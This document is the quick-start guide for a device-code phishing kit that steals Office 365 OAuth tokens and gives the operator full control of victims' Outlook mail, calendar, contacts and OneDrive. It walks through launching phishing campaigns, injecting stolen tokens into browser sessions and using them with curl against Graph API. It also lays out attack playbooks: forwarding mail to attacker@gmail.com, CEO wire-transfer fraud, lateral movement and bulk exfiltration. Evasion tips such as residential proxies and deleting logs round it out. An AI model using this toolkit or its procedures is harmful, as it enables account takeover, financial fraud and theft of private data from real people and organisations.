# Outlook Access Dashboard — Quick Start Guide

## What You Just Built

A comprehensive **Outlook Access Dashboard** that allows you to fully access compromised Office 365 accounts from your browser. No server-side limitations — full Outlook Web Access with all features.

---

## 3 Ways to Access Outlook

### 1. **Dashboard (Easiest) — `/dc/dashboard`**
```
https://your-server.com/dc/dashboard
```

**Features:**
- 📊 **List all targets** from Device Code campaigns
- 🟢 **Status indicators** (Pending, Completed, Expired)
- 🔓 **One-click "Access Outlook"** button for each victim
- 📈 **Stats** showing total targets, completed, pending
- 🔑 Shows which targets have tokens available

**How to use:**
1. Go to `/dc/dashboard`
2. Find your target in the list
3. Click the green **"🔓 Access Outlook"** button
4. Opens victim's Outlook in your browser automatically

---

### 2. **Direct OWA Access — `/dc/open/{landingToken}`**
```
https://your-server.com/dc/open/{landingToken}
```

**What happens:**
- ✅ Auto-refreshes expired tokens
- ✅ Injects victim's authentication tokens
- ✅ Sets up session cookies
- ✅ Redirects to `outlook.office.com/mail/`
- ✅ You're logged in as the victim

**Features available:**
- Read/send/delete emails
- Access calendar
- Manage contacts
- Share documents
- Full OWA functionality

---

### 3. **MSAL Token Injection — `/dc/inject/{landingToken}`**
```
https://your-server.com/dc/inject/{landingToken}
```

**For advanced users who want localStorage injection:**
1. Click the link
2. It generates JavaScript code
3. Paste in browser console on `outlook.cloud.microsoft/favicon.ico`
4. Full Outlook access as the victim

---

## Quick Access From Dashboard

### Individual Victim Dashboard
```
https://your-server.com/dc/use/{landingToken}
```

Shows:
- 👤 User profile (name, email, job title, department)
- 📧 Last 20 emails
- 🔑 Access tokens (copyable)
- 🔓 **Quick buttons** to open Outlook
- 💾 OneDrive files
- 📮 Full inbox view
- 📤 Send email as victim

---

## Complete Workflow

### Step 1: Launch Device Code Campaign
```bash
terminal> dc launch security_alert [emails.txt]
```

### Step 2: Wait for Victims to Approve
- Victims receive phishing email
- Click link, go to microsoft.com/devicelogin
- Enter code from the email
- See "App wants to access your account"
- Click "Yes" → tokens captured!

### Step 3: Access Dashboard
```
https://your-server.com/dc/dashboard
```

### Step 4: One-Click Outlook Access
1. Find victim in dashboard
2. Click **"🔓 Access Outlook"**
3. **BOOM!** Full Outlook access in new tab
4. Read emails, send as victim, download attachments, etc.

---

## What You Can Do With Access

Once you have Outlook open:

**Emails:**
- ✉️ Read all emails (past & present)
- ✉️ Send emails as the victim
- ✉️ Delete emails (cover tracks)
- ✉️ Create email rules
- ✉️ Download attachments

**Calendar:**
- 📅 View all meetings
- 📅 See sensitive meeting details
- 📅 Create fake meetings

**Contacts:**
- 👥 Access company directory
- 👥 See external contacts
- 👥 Export contact list

**Files:**
- 📁 Access OneDrive/SharePoint
- 📁 Download documents
- 📁 Upload files

**Advanced:**
- 🔄 Auto-forward emails to your account
- 📋 Export email data
- 🎯 Pivot to other users (via Shared Mailboxes)

---

## Token Details

### What Gets Captured
```json
{
  "access_token": "eyJ0eXAi...",     // Use for API calls (24h expiry)
  "refresh_token": "0.ARsA...",       // Use to refresh (180 days)
  "id_token": "eyJhbGc..."            // User identity info
}
```

### Access Token
- Used automatically for OWA proxy
- Expires in ~24 hours
- System auto-refreshes using refresh_token

### Refresh Token
- Long-lived (months)
- Can get new access tokens
- Stored in `dc_state.json`

---

## Important Notes

⚠️ **Token Refresh:**
- Tokens are auto-refreshed when you access Outlook
- If access_token expires, refresh_token generates a new one
- If refresh_token expires, you need to re-compromise the account

⚠️ **Session Security:**
- Each OWA session uses a unique session ID
- Isolated cookie jars
- Multiple victims can be accessed simultaneously

⚠️ **Logging:**
- All access is logged (check `/logs/` if available)
- OWA requests go through your proxy (you see them)

---

## Example Attacks

### 1. **Email Harvesting**
1. Access victim's Outlook
2. Go to `/dc/inbox/{token}` to see all emails
3. Copy sensitive emails

### 2. **Email Forwarding**
1. Access victim's Outlook rules
2. Create rule: "Forward all emails to attacker@gmail.com"
3. Passively monitor their inbox

### 3. **CEO Fraud**
1. Access CEO's email
2. Send emails to employees: "Approve urgent wire transfer"
3. Redirect to attacker's account

### 4. **Lateral Movement**
1. Read emails for other account credentials
2. Look for shared mailbox access
3. Pivot to other users

### 5. **Data Exfiltration**
1. Access OneDrive files
2. Export employee records, financial data, etc.
3. Download complete

---

## Troubleshooting

### "No token yet — victim has not approved"
- Victim hasn't gone to microsoft.com/devicelogin yet
- Or they declined permission
- Wait for the email to be clicked and approved

### Token Expiry
- Access tokens expire after 24 hours
- System auto-refreshes automatically
- If refresh_token is gone, target is invalid

### "Session not found"
- Session timed out (24h idle)
- Try accessing Outlook again via dashboard

### Kasada/Bot Detection
- GoDaddy SSO (sso.godaddy.com) uses Kasada
- Script in js_inject handles hostname patching
- If issues, try the MSAL injection method instead

---

## Dashboard Features

### Statistics
- **Total Targets**: All compromised accounts
- **Completed**: Accounts with valid tokens ready to access
- **Pending**: Awaiting victim approval

### Target List
- **Email**: Victim's email address
- **Status**: pending | completed | expired | declined
- **Started**: When campaign began
- **Tokens**: ✅ Yes / ❌ No
- **Actions**: Access Outlook or View Details

### Color Coding
- 🟢 **Green (Completed)**: Full access available
- 🟡 **Yellow (Pending)**: Waiting for victim approval
- 🔴 **Red (Expired/Declined)**: Invalid, need new campaign

---

## API Endpoints Reference

| Endpoint | Purpose |
|----------|---------|
| `/dc/dashboard` | Master target list dashboard |
| `/dc/use/{token}` | Individual victim dashboard (Graph API preview) |
| `/dc/open/{token}` | One-click Outlook access (OWA proxy) |
| `/dc/inbox/{token}` | Full inbox list (Graph API) |
| `/dc/send/{token}` | Send email as victim |
| `/dc/drive/{token}` | OneDrive file access |
| `/dc/inject/{token}` | MSAL localStorage injection |
| `/dc/evil/{token}` | Alternative OWA access method |
| `/dc/estscookies/{token}` | Export ESTS login cookies |

---

## Security Notes

⚠️ **This tool captures OAuth tokens**
- Tokens give full API access to Office 365
- Can bypass MFA (tokens are already authenticated)
- Can create forwarding rules undetected
- Can export sensitive data

⚠️ **Indicators of Compromise**
- Unusual OWA logins from different IPs
- New forwarding rules
- Calendar invites creating meetings
- Session activity at odd times

⚠️ **Defense Evasion**
- Use residential proxies to mask IP
- Access at times matching victim's timezone
- Don't mass-export emails at once
- Delete access logs if possible

---

## Advanced: Using Captured Tokens Elsewhere

If you want to use tokens outside the proxy:

```bash
# Copy access_token from dashboard
TOKEN="eyJ0eXAi..."

# Get inbox via Microsoft Graph API
curl -H "Authorization: Bearer $TOKEN" \
  https://graph.microsoft.com/v1.0/me/messages?$top=20

# Send email
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://graph.microsoft.com/v1.0/me/sendMail \
  -d '{"message":{"subject":"...","body":{"content":"..."},...}}'
```

---

## Summary

✅ **You now have:**
1. Beautiful dashboard listing all targets
2. One-click Outlook access
3. Auto token refresh
4. Full OWA functionality
5. Multiple access methods
6. Complete control over compromised accounts

**Next steps:**
1. Start a Device Code campaign
2. Send phishing emails
3. Wait for approvals
4. Access dashboard
5. Click "Access Outlook"
6. 🎯 Full account compromise!

---

**Built with x-tymus Device Code Flow**
